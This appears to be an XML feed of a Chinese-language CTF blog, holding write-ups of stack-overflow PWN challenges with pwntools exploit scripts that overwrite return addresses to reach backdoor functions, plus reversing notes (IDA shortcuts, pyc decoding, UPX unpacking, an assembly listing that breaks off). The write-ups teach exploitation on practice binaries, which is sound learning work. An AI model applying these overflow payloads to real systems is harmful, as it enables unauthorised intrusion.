        <content type="html"><![CDATA[<p><img src="/images/%7B10D37E23-7399-4EDB-BFAE-C6662B1460E6%7D.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/images/assets/images/Pastedimage20250605162859.png"><br><img src="/images/assets/images/Pastedimage20250605162923.png"><br><img src="/images/assets/images/Pastedimage20250605160858.png"><br><img src="/images/%7B3115B1EC-E572-40CA-94A3-ACD9DAAACB99%7D.png"></p><h3 id="一、漏洞点分析"><a href="#一、漏洞点分析" class="headerlink" title="一、漏洞点分析"></a>一、漏洞点分析</h3><ol><li><strong><code>ctfshow</code> 函数的栈溢出</strong>：</li></ol> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>); <span class="comment">// 读取 0x32（50）字节到 14 字节的 buf → 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><strong>缓冲区大小</strong>：<code>buff[14]</code> 实际占用14字节</li><li><strong>栈位置</strong>：<code>[ebp-12h]</code> (12h &#x3D; 18字节)</li><li><strong>读取长度</strong>：0x32u (50字节)</li></ol><h3 id="正确的偏移计算"><a href="#正确的偏移计算" class="headerlink" title="正确的偏移计算"></a>正确的偏移计算</h3><ol><li>从缓冲区开始到保存的EBP：<code>ebp - buff = 12h = 18字节</code></li><li>从保存的EBP到返回地址：返回地址位于<code>EBP+4</code>处，需要额外4字节</li><li><strong>总偏移</strong>：18字节(到EBP) + 4字节(覆盖EBP) &#x3D; 22字节</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程或远程连接</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn4&#x27;)  # 本地测试</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">53288</span>)  <span class="comment"># 远程攻击</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>+<span class="number">4</span>)        <span class="comment"># 填充18字节</span></span><br><span class="line">payload += p32(<span class="number">0x08048521</span>) <span class="comment"># 覆盖返回地址为backdoor</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)<span class="comment"># 发送payload</span></span><br><span class="line">p.interactive()<span class="comment"># 获取交互式shell</span></span><br></pre></td></tr></table></figure><p><img src="/images/%7BAE10E247-E07F-4983-96FD-5C8A57C3DC35%7D.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gets</title>
      <link href="/2025/06/030503ce257a.html"/>
      <url>/2025/06/030503ce257a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B4CFEA279-2137-4C60-9C95-DDC38ED31AC1%7D1.png"><br>32位仅部分开启RELRO保护<br><img src="/images/%7BF054FEF7-B882-4776-BCDB-686A78907E92%7D1.png"><br><img src="/images/%7B5134CF56-EB95-448F-9D0C-96C479650816%7D.png"><br><img src="/images/Pastedimage20250605152104.png"><br>栈布局：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ s[36] ] [ ebp ] [ 返回地址 ]</span><br></pre></td></tr></table></figure><p>声明了一个长度为 36 字节的字符数组 s，调用 gets 函数，并将 s 数组作为参数传递给它，然后将 gets 函数的返回值作为 ctfshow 函数的返回值。</p><p>这里是 28h，也就是 0x28，对于 32 位程序，我们 payload 还需要加 4 。<br>（根据程序是 32 位还是 64 位，对应加上 4 或 8 个字节的 ebp（栈底））<br><img src="/images/Pastedimage20250605144435.png"><br>漏洞在于 <code>printf(s)</code> 直接使用文件内容作为格式字符串，这会导致：</p><ol><li>如果文件内容包含格式化字符（如 <code>%x</code>, <code>%p</code>, <code>%s</code>），会泄露栈内存</li><li>可能造成内存崩溃（如使用 <code>%n</code> 写入内存）<br>右键Text view<br><img src="/images/Pastedimage20250605150355.png"><br>知道get_flag函数的地址在0x08048586</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn2&#x27;</span>)  <span class="comment">#本地连接</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;10.190.131.17&#x27;,51286) #远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>) </span><br><span class="line"><span class="comment"># get_flag=elf.sym[&#x27;get_flag&#x27;] #查找get_flag函数的地址</span></span><br><span class="line">get_flag_addr = <span class="number">0x08048586</span> <span class="comment">#get_flag 函数地址 </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#构造栈溢出 payload </span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">4</span>) + p32(<span class="number">0x8048586</span>) <span class="comment"># 覆盖返回地址为 get_flag，32位程序用 p32</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload) <span class="comment">#发送 payload</span></span><br><span class="line">p.interactive() <span class="comment">#交互获取 flag 输出 </span></span><br></pre></td></tr></table></figure><p><img src="/images/%7B6BDB377B-73EA-4D11-9676-CA8F8310F6CE%7D.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nc一下</title>
      <link href="/2025/06/74d642c7c583.html"/>
      <url>/2025/06/74d642c7c583.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B1ECE90F1-7E5D-47C4-AA43-FCEB3B41F7F6%7D.png"><br>tzuctf{cf1a020b-4cf7-5909-30a0-8fc5a55e672c}</p><hr><p><img src="/images/%7B5EADDF48-2904-4B55-AA5D-F8B6B4859A14%7D1.png"><br>tzuctf{8b7f5b16-ce7c-adb6-7ae2-10006d2762d3}</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Netcat </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>overflower</title>
      <link href="/2025/06/b2f370f0354e.html"/>
      <url>/2025/06/b2f370f0354e.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B705048A9-C62E-4272-B122-5AF2FADA48EF%7D.png"><br><img src="/images/Pastedimage20250615160603.png"><br><img src="/images/Pastedimage20250615160614.png"><br><img src="/images/Pastedimage20250615160623.png"><br><img src="/images/Pastedimage20250615160632.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; &#x27;</span>,端口号)  </span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x401146</span>  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> +p64(<span class="number">0x40115B</span>) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)  </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250615160703.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/7041daea1662.html"/>
      <url>/2025/06/7041daea1662.html</url>
      
        <content type="html"><![CDATA[<p>空格键：反汇编窗口切换文本跟图形</p><p>Esc：在反汇编窗口中使用为后退到上个操作的地址处</p><p>Shift +F5：打开签名窗口</p><p>shift+F12：自动分析出参考字符串</p><p>ALT+T：搜索字符串(文本搜索)</p><p>ALT+L：标记(Lable)</p><p>ALT+M：设置标签(mark)</p><p>ALT+G：转换局部变量为结构体</p><p>ALT+Enter：跳转到新的窗口</p><p>Alt+B：快捷键用于搜索十六进制字节序列，通常在分析过程中可以用来搜索opcode</p><p>CTRL+M：列举出当前已经添加的标签</p><p>CTRL+S列举出二进制程序的段的开始地址、结束地址、权限等信息</p><p>F9：动态调试程序(其实IDA主要用作静态分析用的)</p><p>F5：将一个函数逆向出来(生成c伪代码)</p><p>G：跳转到指定地址</p><p>A：将选择的信息转换成ASCII(转换成可读性跟强的字符串)</p><p>X(ctrl+X)：交叉引用,类似于OD中的栈回溯操作</p><p>N：对符号重命名</p><p>：&amp;；(冒号&amp;分号)：光标所在位置添加常规注释和可重复注释</p><p>P：创建函数</p><p>T：解析结构体偏移</p><p>M：转换为枚举类型常量</p><p>Y：设置变量类型</p><p>H：转换16进制</p><p>C：光标所在地址处的内容解析成代码</p><p>D：光标所在地址处的内容解析成数据</p><p>A：光标所在地址处的内容解析成ascll码字符串</p><p>U：光标所在地址处的内容解析成未定义内容。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/1d6a1034947c.html"/>
      <url>/2025/06/1d6a1034947c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/0b9e8826945d.html"/>
      <url>/2025/06/0b9e8826945d.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250605084443.png"><br>从 <code>Exeinfo PE</code> 的识别结果来看，文件 <code>re4</code> 是 <strong>PYO 格式</strong>（Python 优化编译后的字节码文件 ），不是常规的 PE 可执行程序（Windows EXE ）。由 Python 脚本编译生成（<code>python -O script.py</code> 命令会生成 <code>.pyo</code> ），比 <code>.pyc</code> 更小、加载更快，但可读性低。<br><img src="/images/Pastedimage20250605085914.png"><br><img src="/images/Pastedimage20250605085556.png"><br>这样提示文件打开是空白的<br><img src="/images/61B19F00-C9FE-410A-B85C-857D129B8E68.png"><br>这是正确的<br><img src="/images/Pastedimage20250605085613.png"><img src="/images/C6F9A70A-E2ED-427B-9929-BFAE4BBEE979.png"><br>&#x3D;&#x3D;<strong>要把文件后缀改成pyc</strong>&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">message</span>):</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Input flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>这个程序定义了一个<code>encode</code>函数，对输入字符串进行处理：</p><ol><li>每个字符的 ASCII 值与 32 进行异或操作</li><li>结果加 16</li><li>将处理后的字符组合成新字符串</li><li>对新字符串进行 Base64 编码<br>最后将编码结果与预定义的<code>correct</code>值进行比较。我们需要逆向这个过程来找到原始的 flag。</li></ol><h3 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h3><p>要还原 flag，我们需要反向执行上述步骤：</p><ol><li>对 Base64 编码进行解码</li><li>每个字符减 16</li><li>与 32 进行异或操作<br>下面是逆向的 Python 代码：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64 </span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27; </span><br><span class="line"># 第一步：Base64解码 </span><br><span class="line">decoded = base64.b64decode(correct) </span><br><span class="line"># 第二步：逆向处理每个字符 </span><br><span class="line">flag = &#x27;&#x27; </span><br><span class="line">for c in decoded: </span><br><span class="line"># Python3中需要处理字节对象 </span><br><span class="line">if isinstance(c, int): </span><br><span class="line">x = c </span><br><span class="line"># Python2中需要处理字节对象 </span><br><span class="line">else: </span><br><span class="line">x = ord(c) </span><br><span class="line">x = x - 16 </span><br><span class="line">x = x ^ 32 </span><br><span class="line">flag += chr(x) </span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>nctf{d3c0mpil1n9_PyC}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> PYC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/09ee5b3fb6a2.html"/>
      <url>/2025/06/09ee5b3fb6a2.html</url>
      
        <content type="html"><![CDATA[<p>好像加了什么东西？<br><img src="/images/%7B95B1D75F-151D-4911-9152-2AAB97FC95D9%7D.png"><br>从 <code>Exeinfo PE</code> 识别结果看，目标文件是 <strong>64 位 ELF 格式</strong>（非 Windows 可执行程序），且加了 <code>UPX</code> 壳 。</p><p>将脱壳的程序叫 re3和 upx.exe 放在同一目录：</p><ol><li><strong>查看壳信息</strong>（确认是 UPX 壳）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -l re3</span><br></pre></td></tr></table></figure>输出会显示 <code>UPX</code> 版本、压缩率等，确认是 UPX 壳再继续。</li><li><strong>执行脱壳</strong>：</li></ol><pre><code>  upx.exe -d re3.exe  ```    - 成功提示：`Unpacked 1 file...`  - 失败提示：`Not packed by UPX`（说明不是 UPX 壳，换其他工具 ）![](images//assets/images/&#123;2641DC93-B260-4C2C-95F1-CFB5B93000BD&#125;.png)![](images//assets/images/Pasted image 20250604161619.png)![](images//assets/images/Pasted image 20250604161706.png)</code></pre>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> UPX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/fbf65d286087.html"/>
      <url>/2025/06/fbf65d286087.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/d15a555fb50a.html"/>
      <url>/2025/06/d15a555fb50a.html</url>
      
        <content type="html"><![CDATA[<p>shift+F12+Fn搜索flag<br><img src="/images/Pastedimage20250604153708.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>source</title>
      <link href="/2025/06/5e1bd234a6b7.html"/>
      <url>/2025/06/5e1bd234a6b7.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">int main(int argc, char *argv[]) &#123; </span><br><span class="line">if (argc != 4) &#123; </span><br><span class="line">printf(&quot;what?\n&quot;); </span><br><span class="line">exit(1); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int first = atoi(argv[1]);</span><br><span class="line">if (first != 0xcafe) &#123; </span><br><span class="line">printf(&quot;you are wrong, sorry.\n&quot;); </span><br><span class="line">exit(2);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int second = atoi(argv[2]); </span><br><span class="line">if (second % 5 == 3 || second % 17 != 8) &#123; </span><br><span class="line">printf(&quot;ha, you won&#x27;t get it!\n&quot;); </span><br><span class="line">exit(3); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123; </span><br><span class="line">printf(&quot;so close, dude!\n&quot;); </span><br><span class="line">exit(4); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">printf(&quot;Brr wrrr grr\n&quot;); </span><br><span class="line"></span><br><span class="line">unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; </span><br><span class="line">printf(&quot;Get your key: &quot;); </span><br><span class="line">printf(&quot;%x\n&quot;, hash); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这个程序需要三个命令行参数才能正常运行：</p><ol><li>第一个参数必须是整数<code>0xcafe</code>（即十进制的 51966）</li><li>第二个参数必须满足两个条件：<ul><li>模 5 不等于 3</li><li>模 17 等于 8</li></ul></li><li>第三个参数必须是字符串&#96;h4cky0</li></ol><p><strong>正确运行方法：</strong><br>.&#x2F;程序名 51966 25 h4cky0u</p><p>Brr wrrr grr<br>Get your key: c0ffee</p><p>OR<br><strong>直接算</strong><br>hash &#x3D; 51966 * 31337 + 8 * 11 + 8 - 1615810207 &#x3D; 1628468542 + 88 + 8 - 1615810207 &#x3D; 1628468638 - 1615810207 &#x3D; 12658431<br>转换为十六进制：<code>0xc0ffee</code></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 直接给程序 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/db3be185141e.html"/>
      <url>/2025/06/db3be185141e.html</url>
      
        <content type="html"><![CDATA[<p>点开这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550                 push    rbp</span><br><span class="line">.text:0000000000401551                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401554                 sub     rsp, 90h</span><br><span class="line">.text:000000000040155B                 call    __main</span><br><span class="line">.text:0000000000401560                 lea     rcx, Buffer     ; &quot;input your flag:&quot;</span><br><span class="line">.text:0000000000401567                 call    puts</span><br><span class="line">.text:000000000040156C                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401570                 mov     rdx, rax</span><br><span class="line">.text:0000000000401573                 lea     rcx, Format     ; &quot;%s&quot;</span><br><span class="line">.text:000000000040157A                 call    scanf</span><br><span class="line">.text:000000000040157F                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401583                 mov     rcx, rax        ; Str</span><br><span class="line">.text:0000000000401586                 call    strlen</span><br><span class="line">.text:000000000040158B                 cmp     rax, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:000000000040158F                 jz      short loc_40159B</span><br><span class="line">.text:0000000000401591                 mov     eax, 0</span><br><span class="line">.text:0000000000401596                 jmp     loc_40162B</span><br><span class="line">.text:000000000040159B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040159B</span><br><span class="line">.text:000000000040159B loc_40159B:                             ; CODE XREF: main+3F↑j</span><br><span class="line">.text:000000000040159B                 mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000004015A2</span><br><span class="line">.text:00000000004015A2 loc_4015A2:                             ; CODE XREF: main+C8↓j</span><br><span class="line">.text:00000000004015A2                 cmp     [rbp+var_4], 22h ; &#x27;&quot;&#x27;</span><br><span class="line">.text:00000000004015A6                 jg      short loc_40161A</span><br><span class="line">.text:00000000004015A8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015AB                 cdqe</span><br><span class="line">.text:00000000004015AD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015B2                 xor     eax, 52h</span><br><span class="line">.text:00000000004015B5                 mov     edx, eax</span><br><span class="line">.text:00000000004015B7                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015BA                 cdqe</span><br><span class="line">.text:00000000004015BC                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015C0                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015C3                 cdqe</span><br><span class="line">.text:00000000004015C5                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015CA                 add     eax, 5</span><br><span class="line">.text:00000000004015CD                 mov     edx, eax</span><br><span class="line">.text:00000000004015CF                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015D2                 cdqe</span><br><span class="line">.text:00000000004015D4                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015D8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015DB                 cdqe</span><br><span class="line">.text:00000000004015DD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015E2                 movsx   eax, al</span><br><span class="line">.text:00000000004015E5                 mov     edx, [rbp+var_4]</span><br><span class="line">.text:00000000004015E8                 movsxd  rdx, edx</span><br><span class="line">.text:00000000004015EB                 lea     rcx, ds:0[rdx*4]</span><br><span class="line">.text:00000000004015F3                 lea     rdx, res</span><br><span class="line">.text:00000000004015FA                 mov     edx, [rcx+rdx]</span><br><span class="line">.text:00000000004015FD                 cmp     eax, edx</span><br><span class="line">.text:00000000004015FF                 jz      short loc_401614</span><br><span class="line">.text:0000000000401601                 lea     rcx, aWrong     ; &quot;Wrong!&quot;</span><br><span class="line">.text:0000000000401608                 call    puts</span><br><span class="line">.text:000000000040160D                 mov     eax, 0</span><br><span class="line">.text:0000000000401612                 jmp     short loc_40162B</span><br><span class="line">.text:0000000000401614 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401614</span><br><span class="line">.text:0000000000401614 loc_401614:                             ; CODE XREF: main+AF↑j</span><br><span class="line">.text:0000000000401614                 add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000401618                 jmp     short loc_4015A2</span><br><span class="line">.text:000000000040161A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040161A</span><br><span class="line">.text:000000000040161A loc_40161A:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:000000000040161A                 lea     rcx, aGood      ; &quot;Good!&quot;</span><br><span class="line">.text:0000000000401621                 call    puts</span><br><span class="line">.text:0000000000401626                 mov     eax, 0</span><br><span class="line">.text:000000000040162B</span><br><span class="line">.text:000000000040162B loc_40162B:                             ; CODE XREF: main+46↑j</span><br><span class="line">.text:000000000040162B                                         ; main+C2↑j</span><br><span class="line">.text:000000000040162B                 add     rsp, 90h</span><br><span class="line">.text:0000000000401632                 pop     rbp</span><br><span class="line">.text:0000000000401633                 retn</span><br><span class="line">.text:0000000000401633 main            endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint = 0x21,0x6,0x6,0x16,0xb,0x19,0x2e,0x65,0x35,0x6a,0x6f,0x38,0x36,0x84,0x70,0x3b,0x39,0x65,0x38,0x35,0x84,0x6f,0x36,0x3c,0x6a,0x38,0x68,0x84,0x66,0x70,0x3b,0x38,0x6a,0x36,0x34,</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 